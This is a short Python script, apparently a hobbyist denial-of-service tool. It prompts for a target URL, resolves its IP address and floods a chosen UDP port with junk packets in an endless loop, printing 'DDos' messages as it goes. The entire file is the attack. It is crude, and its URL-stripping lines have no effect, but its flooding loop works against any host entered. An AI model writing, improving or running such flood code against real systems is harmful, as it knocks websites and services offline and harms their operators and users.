import socket
import platform
import time
import sys
import os

red='\033[31m'
green='\033[32m'
yellow = '\033[93m'
system = platform.uname()[0]

def cls():
    if system == 'Windows':
      os.system("cls")
    elif system == 'Linux':
        os.system("clear")
cls()
os.system("python src/logo.py")

target = input(f"{green}Enter Target URL: ")
target.replace("http://", "")
target.replace("https://","")
target.replace("www.","")

ip = socket.gethostbyname(target)
port = 8020 # recommend ports: 8020, 8080, 4040, 1228, 1224, 6699
joker = "DDOSjsjsjjdjdjdjdjjjjjjjjjiiiiiiiopppkkkkjjjjjhhhbbbbgbvvvvvvvvvvvvhhyggggh"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(bytes(joker,"UTF-8"), (ip,port))
print(port,"IP site address >>",ip)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(bytes(joker,"UTF-8"), (ip,port))
print(port,"IP site address >>",ip)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(bytes(joker,"UTF-8"), (ip,port))
print(port,"IP site address >>",ip)

time.sleep(2)

while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytes(joker,"UTF-8"), (ip,port))
        print(port,"DDos  >>", target)
